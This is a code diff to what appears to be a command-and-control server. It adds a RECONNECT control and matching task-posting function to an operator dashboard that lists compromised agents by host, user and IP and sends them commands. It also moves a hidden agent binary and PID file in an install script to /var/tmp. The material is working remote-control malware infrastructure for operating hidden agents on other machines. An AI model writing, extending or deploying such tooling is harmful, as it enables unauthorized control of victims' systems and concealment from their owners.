@@ -182,7 +182,7 @@ tr:hover{background:#161b22}
 <body>
 <div id="top"><h1>&#9889; C2</h1><code id="kd"></code></div>
 <table><thead><tr><th></th><th>ID</th><th>Host</th><th>User</th><th>OS</th><th>IP</th><th>Seen</th></tr></thead><tbody id="ab"></tbody></table>
-<div id="bar" class="hidden"><span class="l">Agent</span><span class="v" id="si"></span><span class="h">/</span><span class="v" id="sh"></span><span class="h">@</span><span class="v" id="su"></span><button class="k" onclick="ka()">KILL</button></div>
+<div id="bar" class="hidden"><span class="l">Agent</span><span class="v" id="si"></span><span class="h">/</span><span class="v" id="sh"></span><span class="h">@</span><span class="v" id="su"></span><button class="k" onclick="ka()">KILL</button><button class="k" style="background:#d29922" onclick="kr()">RECONNECT</button></div>
 <div id="no">select agent</div>
 <div id="term" class="hidden"><div id="term-out"></div><div id="term-in"><span id="prompt"></span><input id="input" placeholder="command" autofocus spellcheck="false" autocomplete="off"></div></div>
 <script>
@@ -244,6 +244,13 @@ async function ka(){
   ap('/api/task',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agent_id:S,type:'exit',payload:''})});
   let t=document.getElementById('term-out');
   t.textContent+='\n[!] kill sent\n';
+  t.scrollTop=t.scrollHeight;
+}
+async function kr(){
+  if(!S)return;
+  await ap('/api/task',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agent_id:S,type:'reconnect',payload:''})});
+  let t=document.getElementById('term-out');
+  t.textContent+='\n[*] reconnect sent\n';
   t.scrollTop=t.scrollHeight;
 }
 (async()=>{let k=await ap('/api/key');document.getElementById('kd').textContent=k.key;la();setInterval(la,3000)})();
@@ -320,8 +327,8 @@ def dashboard():
 # ─── install scripts ─────────────────────────────────────────────────
 INSTALL_SH = r"""#!/bin/sh
 set -e
-AGENT="/tmp/.c2_agent"
-kill "$(cat /tmp/.c2_pid 2>/dev/null)" 2>/dev/null || true
+AGENT="/var/tmp/.c2_agent"
+kill "$(cat /var/tmp/.c2_pid 2>/dev/null)" 2>/dev/null || true
 rm -f "$AGENT"
 echo "[*] C2 Agent installer"
 case "$(uname -s)" in
